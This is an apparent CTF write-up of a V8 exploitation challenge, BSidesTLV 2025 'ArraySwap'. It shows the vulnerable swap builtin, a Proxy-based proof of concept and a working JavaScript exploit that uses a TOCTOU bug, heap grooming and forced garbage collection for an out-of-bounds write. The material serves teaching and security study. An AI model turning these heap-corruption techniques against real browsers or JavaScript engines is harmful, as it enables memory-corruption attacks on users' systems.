---
title: BSidesTLV 2025 - 'ArraySwap' writeup (pwn)
source: https://pwner.gg/ctf-writeups/2025-12-12-forbidden-swap
source_host: pwner.gg
clip_date: 2026-09-22T10:48:57+08:00
trace_id: 27838f14-a68b-41f2-8366-936c78240dab
content_hash: cccd19d77d6596badbe202e2a14b8a26eac87f67e5f053948e9cf114ea1b4ecb
status: synced
tags:
  - CTF
  - 漏洞分析
series: null
feed_source: pwner·Android/漏洞
ai_summary: "**TL;DR：** 利用 V8 自定义 `Array.prototype.swap` 内置函数中的 TOCTOU 缺陷越界写入，破坏 Flag 对象的 embedder 字段以读取 flag。"
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3e375244-d011-81f3-98e4-f3f7500ecb05
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> **TL;DR：** 利用 V8 自定义 `Array.prototype.swap` 内置函数中的 TOCTOU 缺陷越界写入，破坏 Flag 对象的 embedder 字段以读取 flag。
> 
> - **漏洞成因：** `ArraySwap` builtin 在开头缓存 `length`，读取 index2 时其 `valueOf()` 回调可执行任意 JS 缩短数组，导致缓存的 length 过期，后续越界访问。
> - **初版 PoC：** 用 Proxy 拦截 `valueOf`，成功读到 `0x1bd5a`（即 `0xdead << 1` 的 SMI 编码），确认命中了某个 Flag 的 embedder 字段，但无法保证命中当前持有的那个 Flag。
> - **堆布局失控原因：** `shift()` 会触发 backing store 重分配、Flag 与数组元素交错分配、保存额外引用会改变布局（“海森堡效应”）。
> - **关键技巧：** 数组保持较小（0x40）且先填满数组再创建 Flag 使其紧随其后；用 `pop()` 替代 `shift()`（仅减长度、无重分配）；通过循环分配 2000 个 64KB ArrayBuffer（约 128MB）在无 `--expose-gc` 下强制触发 GC 压实堆。
> - **利用数学：** pop 后剩 12 个元素，OOB 索引 44 实际越界 32 个元素（256 字节），GC 压缩后 Flag embedder 字段恰好落在此处，swap 写入 `0xbeef<<1` 后调用 `flag.secret()` 获得 `BSidesTLV2025{4rr4y_5w4p_0ut_0f_b0undz}`。

This writeup is about the ‘ArraySwap’ challenge from BSidesTLV 2025 CTF. It was a V8 exploitation challenge involving a TOCTOU bug in a custom `Array.prototype.swap` function. The goal was to corrupt a `Flag` object’s embedder field to retrieve the flag.

So, here it is/let’s begin.

## Challenge files

We got a patched d8 binary(V8’s JavaScript shell) with a custom `swap()` method added to `Array.prototype`. The challenge also introduces a `Flag` class - a native object with an embedder field initialized to `0xdead`. To get the flag, we need to corrupt this field to `0xbeef` and call `flag.secret()`.

## The bug

The flaw is a classic TOCTOU (Time-of-Check to Time-of-Use) in the `ArraySwap` builtin:

```cpp
BUILTIN(ArraySwap) {
  HandleScope scope(isolate);
  // ...
  
  Handle<JSArray> array = Cast<JSArray>(receiver);
  uint32_t length = static_cast<uint32_t>(IsNumber(*length_obj) 
    ? Object::NumberValue(*length_obj) : 0);
 
  // Get index1
  Handle<Object> index1_obj = args.at(1);
  uint32_t index1 = /* ... */;
 
  // Bounds check HERE
  if (index1 >= length) {
    THROW_NEW_ERROR_RETURN_FAILURE(/* ... */);
  }
 
  // Get index2 - can trigger valueOf() callback!
  Handle<Object> index2_obj = args.at(2);
  uint32_t index2 = /* ... */;
 
  // Bounds check uses cached `length` (TOCTOU!)
  if (index2 >= length) {
    THROW_NEW_ERROR_RETURN_FAILURE(/* ... */);
  }
 
  // Perform the swap (OOB if array was shrunk!)
  // ...
}
```

The bug: `length` is cached at the start. When getting `index2`, a `valueOf()` callback can execute arbitrary JS. If we shrink the array inside `valueOf()`, the cached `length` becomes stale → OOB access.

## Initial PoC

At first, I tried to mess around with it by using a `Proxy` to intercept the `valueOf` call:

```javascript
let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let u64 = new BigUint64Array(buf);
 
function f2i(f) { f64[0] = f; return u64[0]; }
function i2f(i) { u64[0] = i; return f64[0]; }
 
const ARR_LEN = 0x40;
const NEW_LEN = 0x10;
 
let victim = [];
let cur_len = ARR_LEN;
 
for (let i = 0; i < ARR_LEN; i++) {
    victim[i] = 1.1 * i;
}
 
let flag = new Flag();
 
let proxy = new Proxy({}, {
    get(target, prop) {
        if (prop === 'valueOf') {
            return function() {
                // shrink the array
                while (NEW_LEN != cur_len) {
                    victim.shift();
                    cur_len--;
                }
                return 44; // OOB index
            };
        }
    }
});
 
victim[0] = i2f(BigInt(0xbeef << 1));
victim.swap(0, proxy);
 
let rb = f2i(victim[0]);
console.log('readback: 0x' + rb.toString(16));
```

Output:

```
readback: 0x1bd5a
```

Nice! `0x1bd5a` is `0xdead << 1` (V8’s SMI encoding). This means we’re hitting a Flag’s embedder field. However, calling `flag.secret()` didn’t work - we corrupted *some* flag but not the one we have a reference to.

## The heap layout problem

I faced an obstacle: without heap compaction, the Flag object is not at a predictable offset from our array. I spent a lot of time trying different approaches:

-   Using `shift()` to shrink the array - causes V8 to reallocate the backing store, making the heap layout unpredictable
-   Interleaving flag allocations with array elements - creates complex heap layouts, and saving references to flags changes the layout (“Heisenberg effect” lol)
-   Large arrays with heap scanning - more fragmentation = less predictable layouts

In all cases, I could confirm we’re hitting `0xdead` values (Flag embedder fields), but couldn’t identify *which* Flag was corrupted. Classic heap feng shui problems:D

## The working exploit

The solution uses several key tricks to make the heap layout predictable:

```javascript
let conversion_buf = new ArrayBuffer(8);
let f64_view = new Float64Array(conversion_buf);
let u64_view = new BigUint64Array(conversion_buf);
 
function f2i(f) { f64_view[0] = f; return u64_view[0]; }
function i2f(i) { u64_view[0] = i; return f64_view[0]; }
 
function trigger_gc() {
    for (let i = 0; i < 2000; i++) {
        new ArrayBuffer(0x10000);
    }
}
 
const old_len = 0x40;
 
let victim = [];
for (let i = 0; i < old_len; i++) {
    victim[i] = 1.1 * i;
}
 
let flag = new Flag();
 
let meow = {
    valueOf() {
        for (let i = 1; i < old_len-11; i++)
            victim.pop(); // shrink :D
 
        trigger_gc();
        return 44;
    }
};
 
victim[0] = i2f(BigInt(0xbeef << 1));
victim.swap(0, meow);
 
try {
    let result = flag.secret();
    console.log('[+] flag:', result);
} catch (e) {
    console.log('[-] Exploit failed:', e.message);
}
```

Output:

```
[+] flag: BSidesTLV2025{4rr4y_5w4p_0ut_0f_b0undz}
```

## What made the difference

So what changed between my failed attempts and the working exploit? Mostly heap stability.

First, I kept the array small - `old_len = 0x40` (64 elements). Smaller footprint means less fragmentation to deal with.

Second, I made sure to allocate the array fully *before* creating the Flag:

```javascript
for (let i = 0; i < old_len; i++) {
    victim[i] = 1.1 * i;
}
let flag = new Flag();
```

This way the Flag lands right after the array’s backing store in memory. No interleaving, no surprises.

Third - and this was my biggest mistake earlier - I switched from `shift()` to `pop()`. `shift()` removes from the front and causes V8 to reallocate the backing store, completely trashing the heap layout. `pop()` just decrements the length, O(1), no reallocation. I wasted way too long before realizing this.

The real trick I was missing though was forcing GC without `--expose-gc`:

```javascript
function trigger_gc() {
    for (let i = 0; i < 2000; i++) {
        new ArrayBuffer(0x10000);  // 64KB each = 128MB total
    }
}
```

Allocating 128MB of ArrayBuffers pressures V8 into running garbage collection, which compacts the heap and places objects at predictable offsets. This is a classic browser exploitation technique and I really should’ve remembered it from browser pwn CTFs:P

I also ditched the Proxy in favor of a plain object with `valueOf()` - less overhead, simpler heap state.

## The math

```
Original array length: 64
After pop(): 12 elements remain (64 - 52)
OOB index: 44
Actual OOB: 44 - 12 = 32 elements beyond bounds
Byte offset: 32 * 8 = 256 bytes past array end
```

After GC compaction, the Flag’s embedder field lands exactly at this offset. So `swap()` uses the stale length (64), happily accepts index 44, and swaps `array[0]` (which we set to `0xbeef << 1`) with what it thinks is `array[44]` - which is actually the Flag’s embedder field. Call `flag.secret()` and we’re done.

## Lessons learned

-   **Heap stability is everything**: The difference between my failed attempts and the working exploit was all about heap stability. `pop()` vs `shift()`, small arrays vs large arrays, sequential allocation vs interleaved.
    
-   **trigger_gc() without —expose-gc**: Allocating a bunch of ArrayBuffers forces GC. Essential technique for browser exploitation.
    
-   **Simplicity wins**: My complex approaches with Proxies, large arrays, and interleaved allocations all failed. The working exploit is remarkably simple.
    
-   **The “Heisenberg effect”**: Saving references to objects can change heap layout. Sometimes you just gotta trust the math and keep minimal references.
    

Thanks for the challenge!
